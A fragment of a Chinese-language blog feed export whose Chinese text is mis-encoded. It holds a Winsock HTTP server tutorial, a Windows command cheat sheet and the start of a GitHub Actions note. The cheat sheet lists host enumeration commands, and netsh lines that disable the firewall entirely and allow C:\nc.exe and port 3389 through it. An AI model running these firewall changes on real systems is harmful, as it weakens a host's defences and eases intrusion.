buffer);</span><br></pre></td></tr></table></figure></li><li>è§£æHTTPè«‹æ±‚  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> method[<span class="number">16</span>];</span><br><span class="line"><span class="type">char</span> url[<span class="number">256</span>];</span><br><span class="line"><span class="type">char</span> version[<span class="number">16</span>];</span><br><span class="line">sscanf_s(buffer, <span class="string">&quot;%s %s %s&quot;</span>, method, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(method), url, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(url), version, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(version));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Parsed request: method=%s, url=%s, version=%s\n&quot;</span>, method, url, version);</span><br></pre></td></tr></table></figure></li><li>å»ºæ§‹HTTPå›è¦†  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> response[BUFFER_SIZE];</span><br><span class="line">sprintf_s(response, BUFFER_SIZE, <span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHello, World!&quot;</span>);</span><br><span class="line"><span class="type">int</span> responseLen = (<span class="type">int</span>)<span class="built_in">strlen</span>(response);</span><br></pre></td></tr></table></figure></li><li>ç™¼é€HTTPå›è¦†  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">result = send(clientSocket, response, responseLen, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">    <span class="comment">//éŒ¯èª¤è™•ç†</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Sent response:\n%s&quot;</span>, response);</span><br></pre></td></tr></table></figure></li><li>é—œé–‰socket  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">closesocket(clientSocket);</span><br><span class="line">closesocket(listenSocket);</span><br><span class="line">WSACleanup();</span><br></pre></td></tr></table></figure></li></ul><h2 id="ç¨‹å¼åŸ·è¡Œçµæœ"><a href="#ç¨‹å¼åŸ·è¡Œçµæœ" class="headerlink" title="ç¨‹å¼åŸ·è¡Œçµæœ"></a>ç¨‹å¼åŸ·è¡Œçµæœ</h2><ul><li>å•Ÿå‹•HTTP Server<br><img src="https://i.imgur.com/J1qd5dQ.png"></li><li>å­˜å– <a href="http://localhost/">http://localhost/</a><br><img src="https://i.imgur.com/wowoin8.png"></li><li>çµ‚ç«¯é¡¯ç¤ºçµæœ<br><img src="https://i.imgur.com/ViLckvN.png"></li></ul><h2 id="Winsock2-h-ä¸­çš„å‡½å¼ç”¨æ³•åŠæ„ç¾©"><a href="#Winsock2-h-ä¸­çš„å‡½å¼ç”¨æ³•åŠæ„ç¾©" class="headerlink" title="Winsock2.h ä¸­çš„å‡½å¼ç”¨æ³•åŠæ„ç¾©"></a>Winsock2.h ä¸­çš„å‡½å¼ç”¨æ³•åŠæ„ç¾©</h2><ul><li><strong>WSAStartup</strong><ul><li>ç”¨æ–¼åˆå§‹åŒ– Winsock å‡½å¼åº«ï¼Œæ¥æ”¶è³‡æ–™å‹åˆ¥ç‚º<strong>WORD</strong>çš„ç‰ˆæœ¬åƒæ•¸ä»¥åŠè³‡æ–™å‹åˆ¥ç‚º<strong>WSADATA</strong>çš„struct pointer</li><li>æœƒå›å‚³æ•´æ•¸ï¼Œå‡½å¼å‘¼å«æˆåŠŸå‰‡å›å‚³0ï¼Œå¦å‰‡å›å‚³error code</li></ul></li><li><strong>socket</strong><ul><li>ç”¨æ–¼å»ºç«‹æ–°çš„socketï¼Œæ¥æ”¶ä¸‰å€‹åƒæ•¸: å”å®šå®¶æ—ã€socketç¨®é¡ä»¥åŠå”å®šé¡å‹</li><li><pre><code class="c=">SOCKET WSAAPI socket(    [in] int af,    [in] int type,    [in] int protocol);<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    - ä»–æœƒå›å‚³ä¸€å€‹ **SOCKET**</span><br><span class="line">- **bind**</span><br><span class="line">    - ç¶å®šSocketåˆ°æœ¬åœ°åœ°å€å’Œportï¼Œæ¥æ”¶ä¸‰å€‹åƒæ•¸:socket æè¿°å­ã€ä½å€ä»¥åŠä½å€é•·åº¦</span><br><span class="line">    - ```c=</span><br><span class="line">      int WSAAPI bind(</span><br><span class="line">       [in] SOCKET         s,</span><br><span class="line">       [in] const sockaddr *name,</span><br><span class="line">       [in] int            namelen</span><br><span class="line">      );</span><br></pre></td></tr></table></figure></code></pre></li><li>å›å‚³æ•´æ•¸</li></ul></li><li><strong>listen</strong><ul><li>ç”¨æ–¼ç›£è½socketï¼Œç­‰å¾…å®¢æˆ¶ç«¯é€£æ¥ï¼Œå®ƒæ¥æ”¶å…©å€‹åƒæ•¸ï¼šsocketæè¿°å­ä»¥åŠå’Œç­‰å¾…é€£æ¥ä½‡åˆ—çš„æœ€å¤§é•·åº¦</li><li><pre><code class="c=">int WSAAPI listen(    [in] SOCKET s,    [in] int    backlog  );<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     - å›å‚³æ•´æ•¸</span><br><span class="line">- **accept**</span><br><span class="line">    - æ¥å—å®¢æˆ¶ç«¯çš„é€£æ¥ï¼Œä¸¦å›å‚³ä¸€å€‹æ–°çš„Socketæè¿°å­</span><br><span class="line">    - æ¥æ”¶å…©å€‹åƒæ•¸: Socketæè¿°å­å’Œå®¢æˆ¶ç«¯åœ°å€çš„pointer</span><br><span class="line">    - ```c=</span><br><span class="line">      SOCKET WSAAPI accept(</span><br><span class="line">         [in]      SOCKET   s,</span><br><span class="line">         [out]     sockaddr *addr,</span><br><span class="line">         [in, out] int      *addrlen</span><br><span class="line">      );</span><br></pre></td></tr></table></figure></code></pre></li><li>æœƒå›å‚³ä¸€å€‹ <strong>SOCKET</strong> å‹åˆ¥çš„å€¼ï¼Œä»¥è¡¨ç¤ºæ–°çš„Socketæè¿°å­</li></ul></li><li><strong>recv</strong><ul><li>æ¥æ”¶å®¢æˆ¶ç«¯ç™¼é€çš„è³‡æ–™</li><li>æ¥æ”¶å››å€‹åƒæ•¸: Socketæè¿°å­ã€æ¥æ”¶ç·©è¡å€çš„pointerã€ç·©è¡å€çš„å¤§å°å’Œæ¥æ”¶é¸é …</li><li><pre><code class="c=">int WSAAPI recv(   [in]  SOCKET s,   [out] char   *buf,   [in]  int    len,   [in]  int    flags );<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    - å›å‚³æ•´æ•¸</span><br><span class="line">- **send**</span><br><span class="line">    -  ç™¼é€è³‡æ–™åˆ°å®¢æˆ¶ç«¯</span><br><span class="line">    -  ä»–æ¥å—å››å€‹åƒæ•¸: Socketæè¿°å­ã€ç™¼é€ç·©è¡å€çš„pointerã€ç·©è¡å€çš„å¤§å°å’Œç™¼é€é¸é …</span><br><span class="line">    -  ```c=</span><br><span class="line">       int WSAAPI send(</span><br><span class="line">         [in] SOCKET     s,</span><br><span class="line">         [in] const char *buf,</span><br><span class="line">         [in] int        len,</span><br><span class="line">         [in] int        flags</span><br><span class="line">        );</span><br></pre></td></tr></table></figure></code></pre></li><li>å›å‚³æ•´æ•¸</li></ul></li><li><strong>closesocket</strong><ul><li>é—œé–‰Socket</li><li>æ¥æ”¶ä¸€å€‹socket æè¿°å­ä½œç‚ºåƒæ•¸</li><li><pre><code class="c=">int WSAAPI closesocket(    [in] SOCKET s);  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    - å›å‚³æ•´æ•¸</span><br><span class="line">- **WSACleanup**</span><br><span class="line">    - æ¸…ç†WinSockå‡½å¼åº«çš„è³‡æºï¼Œä¸æ¥æ”¶ä»»ä½•åƒæ•¸ï¼Œä¸¦å›å‚³æ•´æ•¸</span><br><span class="line">    - ```c=</span><br><span class="line">      int WSAAPI WSACleanup();</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><p>ä¸Šè¿°å‡½å¼ä¸­ä»»ä½•å›å‚³æ•´æ•¸çš„å‡½å¼ï¼Œè‹¥å›å‚³å€¼ç‚º0ï¼Œå‰‡ç‚ºå‡½å¼å‘¼å«æˆåŠŸï¼Œå¦å‰‡ç‚ºError code</p>]]></content>
      
      
      <categories>
          
          <category> å­¸ç¿’ç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¶²è·¯ç¨‹å¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ’» Windows å¸¸è¦‹æŒ‡ä»¤</title>
      <link href="/posts/5b6eeeb3.html"/>
      <url>/posts/5b6eeeb3.html</url>
      
        <content type="html"><![CDATA[<h2 id="è’é›†æœ¬æ©Ÿè³‡è¨Š"><a href="#è’é›†æœ¬æ©Ÿè³‡è¨Š" class="headerlink" title="è’é›†æœ¬æ©Ÿè³‡è¨Š"></a>è’é›†æœ¬æ©Ÿè³‡è¨Š</h2><ul><li>ç¶²è·¯è¨­å®šè³‡è¨Š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/all</span><br></pre></td></tr></table></figure></li><li>ä½œæ¥­ç³»çµ±ä»¥åŠç‰ˆæœ¬è³‡è¨Š<ul><li>ä¸­æ–‡ç‰ˆ  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;ä½œæ¥­ç³»çµ±åç¨±&quot; /C:&quot;ä½œæ¥­ç³»çµ±ç‰ˆæœ¬&quot;</span><br></pre></td></tr></table></figure></li><li>è‹±æ–‡ç‰ˆ  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure></li></ul></li><li>ç³»çµ±çµæ§‹<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure></li><li>æŸ¥çœ‹å®‰è£çš„è»Ÿé«”ç‰ˆæœ¬<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure></li><li>æŸ¥è©¢æœ¬æ©Ÿæœå‹™<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure></li><li>æŸ¥è©¢è™•ç†ç¨‹åºåˆ—è¡¨<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure></li><li>æŸ¥çœ‹å•Ÿå‹•ç¨‹å¼<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure></li><li>æŸ¥çœ‹ä»»å‹™è¨ˆç•«<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure></li><li>æŸ¥çœ‹ä¸»æ©Ÿé–‹æ©Ÿæ™‚é–“<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure></li><li>æŸ¥çœ‹ä½¿ç”¨è€…åˆ—è¡¨<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure></li><li>ç²å–æœ¬æ©Ÿç®¡ç†å“¡è³‡è¨Š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure></li><li>æŸ¥çœ‹ç•¶å‰ç·šä¸Šä½¿ç”¨è€…<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure></li><li>åˆ—å‡ºæœ¬æ©Ÿé›»è…¦ä»¥åŠæ‰€é€£æ¥çš„ç”¨æˆ¶ç«¯ä¹‹é–“çš„Session<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session //é€šå¸¸éœ€è¦admin æ¬Šé™æ‰èƒ½åŸ·è¡Œ</span><br></pre></td></tr></table></figure></li><li>æŸ¥è©¢é€šè¨ŠåŸ åˆ—è¡¨<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></li><li>æŸ¥è·¯ç”±è¡¨ä»¥åŠå¯ç”¨çš„ARP Cacheè¡¨<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure></li><li>é—œé–‰é˜²ç«ç‰†<ul><li>Windows Server 2003åŠä»¥å‰çš„ç‰ˆæœ¬  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure></li><li>Windows Server 2003ä¹‹å¾Œçš„ç‰ˆæœ¬  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure></li></ul></li><li>æŸ¥çœ‹é˜²ç«ç‰†è¨­å®š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure></li><li>ä¿®æ”¹é˜²ç«ç‰†è¨­å®š<ul><li>Windows Server 2003åŠä»¥å‰çš„ç‰ˆæœ¬  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add allowedprogram C:\nc.exe &quot;allow nc&quot; enable</span><br></pre></td></tr></table></figure></li><li>Windows Server 2003ä¹‹å¾Œçš„ç‰ˆæœ¬  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure></li><li>å…è¨±æŒ‡å®šç¨‹å¼é€€å‡º  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure></li><li>å…è¨±3389 Porté€šè¡Œ  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure></li></ul></li><li>è‡ªè¨‚é˜²ç«ç‰†ç´€éŒ„æª”çš„å„²å­˜ä½ç½®<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> æŒ‡ä»¤/å·¥å…·ç”¨æ³•æ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> PowerShell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ“‘Github Action å­¸ç¿’ç­†è¨˜</title>
      <link href="/posts/24be9e02.html"/>
      <url>/posts/24be9e02.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/zn0lCzN.png"></p><p>æˆ‘ä»¥å‰å…¶å¯¦æ²’æœ‰CI&#x2F;CDçš„ç¶“é©—ï¼Œæ‰€ä»¥ç¾æœ‰å¸¸è¦‹çš„CI&#x2F;CDå¹³å°å…¶å¯¦éƒ½æ²’æœ‰å¤ªéäº†è§£ï¼Œä½†è¿‘æœŸå› å°ˆæ¡ˆéœ€æ±‚ï¼Œéœ€è¦é€éGithub Actionã€€ä¾†å»ºç«‹ä¸€å€‹ç”¨æ–¼AzureèªçŸ¥æœå‹™ä¸­çš„<strong>æ–·å¥API (BreakSentence API)</strong> çš„CI&#x2F;CD Pipelineï¼Œåœ¨è¢«äº¤ä»˜çš„éœ€æ±‚é‚„å¾ˆæ¨¡ç³Šçš„ç‹€æ³ä¸‹ğŸ˜­ï¼Œé‚„æ˜¯å…ˆä¾†äº†è§£é€™é …åŠŸèƒ½ï¼Œä¸¦ä¸”åšå€‹ç´€éŒ„ã€‚</p><h2 id="åŸºæœ¬ä»‹ç´¹"><a href="#åŸºæœ¬ä»‹ç´¹" class="headerlink" title="åŸºæœ¬ä»‹ç´¹"></a>åŸºæœ¬ä»‹ç´¹</h2><p>æ˜¯ä¸€å€‹CI&#x2F;CDå¹³å°ï¼Œèƒ½å¤ è‡ªå‹•åŒ–å»ºç½®(Build)ã€æ¸¬è©¦(Test)ä»¥åŠéƒ¨ç½²(Deployment)ï¼Œä½¿ç”¨è€…å¯ä»¥å»ºç«‹å·¥ä½œæµç¨‹(Workflow)ä¾†å»ºç½®ä»¥åŠæ¸¬è©¦æ¯å€‹å°Repositoryçš„pullè«‹æ±‚æˆ–è€…æ˜¯å°‡åˆä½µçš„pullè«‹æ±‚éƒ¨ç½²åˆ°ç”Ÿç”¢ç’°å¢ƒã€‚</p><h2 id="Components"><a href="#Components" class="headerlink" title="Components"></a>Components</h2><p>æ§‹æˆGithub Actionsä¸­çš„å…ƒä»¶åè©å¦‚ä¸‹</p><ul><li>Workflow</li><li>Event</li><li>Jobs</li><li>Runner</li><li>Steps</li><li>Action</li></ul><p>å…ˆè¬›é€™äº›å…ƒä»¶çš„åˆä½œèµ·ä¾†çš„è¡Œç‚ºæœƒæ˜¯æ€éº¼æ¨£: ç•¶Repositoryä¸­ç™¼ç”ŸæŸå€‹ <strong>äº‹ä»¶(Event)<strong>ï¼Œæ­¤æ™‚ä½ æ‰€è¨­å®šçš„ Github Actions <strong>Workflows</strong> è¢«è§¸ç™¼ã€‚é€™è£¡çš„äº‹ä»¶ï¼Œèˆ‰ä¾‹ä¾†èªªå¯ä»¥æ˜¯</strong>ä¸€å€‹pull requestè«‹æ±‚</strong>æˆ–æ˜¯<strong>æŸå€‹issuedè¢«å»ºç«‹</strong> ç­‰ç­‰ã€‚</p><p><img src="https://i.imgur.com/SuvKp3J.png" alt="&#39;Github Action workflows&#39;"></p><p>ä½ æ‰€å®šç¾©çš„Workflowç•¶ä¸­åŒ…å«äº†ä¸€å€‹æˆ–å¤šå€‹ <strong>Jobs</strong> ï¼Œé€™äº›Jobså¯ä»¥æ˜¯è¢«<strong>å¹³è¡Œè™•ç†(Parallel)</strong> æˆ–æ˜¯ <strong>ä¾åºè™•ç†(Sequential)</strong> ï¼Œæ¯å€‹Jobsæœƒåœ¨è‡ªå·±çš„è™›æ“¬æ©ŸRunnerè¢«è™•ç†ï¼Œæˆ–è€…æ˜¯åœ¨å®¹å™¨å…§é‹è¡Œã€‚è€Œæ¯å€‹Jobsä¸­æœ‰åŒ…å«äº†ä¸€å€‹æˆ–å¤šå€‹ <strong>Steps</strong> ï¼ŒæœƒåŸ·è¡Œä½ å®šç¾©çš„è…³æœ¬æˆ–æ˜¯æŸå€‹ <strong>Action</strong>ï¼ŒActionæ˜¯Github Actionç•¶ä¸­çš„æœ€å°å–®ä½ï¼Œæ˜¯ä¸€å€‹å¯é‡è¤‡ä½¿ç”¨çš„æ“´å±•ï¼Œé€šå¸¸æ˜¯æŸäº›é€šç”¨æŒ‡ä»¤(?ğŸ˜¥)</p><h2 id="ğŸ”€Workflows"><a href="#ğŸ”€Workflows" class="headerlink" title="ğŸ”€Workflows"></a>ğŸ”€Workflows</h2><ul><li>ä¸€å€‹å¯è¨­å®šä¾†è‡ªå‹•åŒ–æµç¨‹çš„ä¸€å€‹æˆ–å¤šå€‹Jobsè¢«ç¨±ä½œç‚ºWorkflowï¼Œå¯ä»¥é€éæ’°å¯«YAMLæª”ä¾†å®šç¾©Workflow,ä¸¦åœ¨Eventç™¼ç”Ÿæ™‚è¢«è§¸ç™¼ï¼Œä¹Ÿå¯ä»¥æ‰‹å‹•è§¸ç™¼ã€‚</li><li>Workflowè¢«å®šç¾©åœ¨Repoä¸­çš„ <code>.github/workflows</code> è·¯å¾‘åº•ä¸‹</li><li>ä¸€å€‹Repoå¯ä»¥æœ‰å¤šå€‹Workflowsï¼Œä¸¦è² è²¬åŸ·è¡Œå„ç¨®ä¸åŒçš„ä»»å‹™<ul><li>åƒæ˜¯ï¼Œä¸€å€‹ç”¨æ–¼Buildè·ŸTestçš„Workflow</li><li>å¦ä¸€å€‹å‰‡æ˜¯åœ¨Releaseç™¼å¸ƒå¾Œéƒ¨ç½²æ‡‰ç”¨åˆ°ç”Ÿç”¢ç’°å¢ƒçš„Workflow</li></ul></li></ul><h2 id="âœ´ï¸Events"><a href="#âœ´ï¸Events" class="headerlink" title="âœ´ï¸Events"></a>âœ´ï¸Events</h2><p>Eventä»£è¡¨åœ¨Repositoryä¸­çš„ç‰¹å®šè¡Œç‚ºï¼Œåƒæ˜¯:</p><ul><li>pull request</li><li>open issues</li><li>psuhes a commit to repo â€¦etc</li></ul><p>ç”¨æ–¼è§¸ç™¼Workflowsçš„Eventå¯ä»¥åƒè€ƒé€™ä»½æ–‡ä»¶<br><a href="https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows">https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows</a></p><h2 id="ğŸ—‚ï¸Jobs"><a href="#ğŸ—‚ï¸Jobs" class="headerlink" title="ğŸ—‚ï¸Jobs"></a>ğŸ—‚ï¸Jobs</h2><p>ä¸€çµ„Stepsè¢«ç¨±ä½œJob,ä¸¦ä¸”åŸ·è¡Œåœ¨Runnerä¸Šï¼Œæ¯å€‹Stepså¯èƒ½æœƒæ˜¯ä¸€å€‹Shell Scriptæˆ–æ˜¯Actionè¢«åŸ·è¡Œã€‚Stepsæœƒä¾åºåŸ·è¡Œï¼Œä¸”ç”±æ–¼æ¯å€‹Stepsæ˜¯åœ¨ç›¸åŒçš„Runnerä¸Šè¢«åŸ·è¡Œï¼Œå› æ­¤å¯ä»¥åœ¨ä¸åŒStepsä¹‹é–“å…±äº«ç›¸åŒè³‡æ–™ã€‚ èˆ‰ä¾‹ï¼š ä¸€å€‹stepå»ºç½®å®Œæ‡‰ç”¨å¾Œå¦ä¸€å€‹stepä¾†æ¸¬è©¦æ‡‰ç”¨ã€‚</p><p>ä½ ä¹Ÿå¯ä»¥è¨­å®šJobsçš„ä¾è³´é …ï¼Œä¸€æ—¦ä¸€å€‹Jobsä¾è³´å¦ä¸€å€‹Jobï¼Œå‰‡æœƒç­‰å¾…å¦ä¸€å€‹Jobå®Œæˆå¾Œæ‰é–‹å§‹åŸ·è¡Œè‡ªå·±çš„ä»»å‹™ã€‚<br><a href="https://docs.github.com/en/actions/using-jobs">https://docs.github.com/en/actions/using-jobs</a></p><h2 id="ğŸ“‘Actions"><a href="#ğŸ“‘Actions" class="headerlink" title="ğŸ“‘Actions"></a>ğŸ“‘Actions</h2><p>Actionæ˜¯ä¸€å€‹å°ˆç‚ºGithub Actionå¹³å°è¨­è¨ˆçš„ç¨‹åºï¼Œå¯åŸ·è¡Œè¤‡é›œã€é«˜é »ç‡ä¸”é‡è¤‡çš„å·¥ä½œã€‚<br>é€éActionå¯ä»¥æ¸›å°‘å‡ºç¾åœ¨workflowæª”æ¡ˆä¸­å¤§é‡é‡è¤‡çš„ç¨‹å¼ç¢¼ã€‚<br>ä¸€å€‹Actionå¯ä»¥åšåˆ°åƒæ˜¯å¾Githubç•¶ä¸­æ‹‰å–repositoryï¼Œä¸¦ç‚ºæ‰€å»ºç½®çš„ç’°å¢ƒè¨­å®šæ­£ç¢ºçš„å·¥å…·é›†ï¼Œä¸¦è¨­å®šå¥½èˆ‡ä½ çš„é›²ç«¯ä¾›æ‡‰ç”¨å•†ä¹‹é–“çš„èº«åˆ†é©—è­‰ã€‚</p><p>è¨­å®šAction:<a href="https://docs.github.com/en/actions/creating-actions">https://docs.github.com/en/actions/creating-actions</a></p><h2 id="ğŸ“¦Runners"><a href="#ğŸ“¦Runners" class="headerlink" title="ğŸ“¦Runners"></a>ğŸ“¦Runners</h2><p>ç”¨æ–¼é‹è¡Œworkflowçš„Serverï¼Œæ¯å€‹Runnerä¸€æ¬¡åªæœƒåŸ·è¡Œä¸€å€‹Jobã€‚<br>Githubæä¾› Ubuntuã€Windowsä»¥åŠMacOS Runnerä¾†åŸ·è¡ŒWorkflowã€‚<br>ä¹Ÿæœƒå¤§å‹Runneréœ€æ±‚è€…æä¾›è§£æ±ºæ–¹æ¡ˆ:<a href="https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners">https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners</a><br>è‹¥æ‰€éœ€åŸ·è¡Œç’°å¢ƒéœ€è¦ä¸åŒçš„OSæˆ–ç‰¹è¦ç¡¬é«”è¨­å®šï¼Œä½¿ç”¨è€…ä¹Ÿå¯ä»¥hostè‡ªå·±çš„Runner <a href="https://docs.github.com/en/actions/hosting-your-own-runners">https://docs.github.com/en/actions/hosting-your-own-runners</a></p><h2 id="å»ºç«‹-Workflow"><a href="#å»ºç«‹-Workflow" class="headerlink" title="å»ºç«‹ Workflow"></a>å»ºç«‹ Workflow</h2><p>Github Action ä½¿ç”¨YAMLä¾†å»ºç«‹Workflowã€‚æ¯å€‹ Workflow éƒ½ä»¥ç¨ç«‹çš„YAMLæª”å„²å­˜ï¼Œä¸¦ä¸”æ”¾ç½®åœ¨ <code>.github/workflows</code> è·¯å¾‘åº•ä¸‹</p><h2 id="å»ºç«‹ç¯„ä¾‹-Workflows"><a href="#å»ºç«‹ç¯„ä¾‹-Workflows" class="headerlink" title="å»ºç«‹ç¯„ä¾‹ Workflows"></a>å»ºç«‹ç¯„ä¾‹ Workflows</h2><ul><li>å»ºç«‹è·¯å¾‘:  <code>.gituhb/workflows</code></li><li>åœ¨ <code>.github/workflows</code> ç•¶ä¸­å»ºç«‹ <code>learn-github-action.yml</code><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">learn-github-actions</span></span><br><span class="line"><span class="attr">run-name:</span> <span class="string">$&#123;&#123;</span> <span class="string">github.actor</span> <span class="string">&#125;&#125;</span> <span class="string">is</span> <span class="string">learning</span> <span class="string">GitHub</span> <span class="string">Actions</span></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>]</span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">check-bats-version:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span 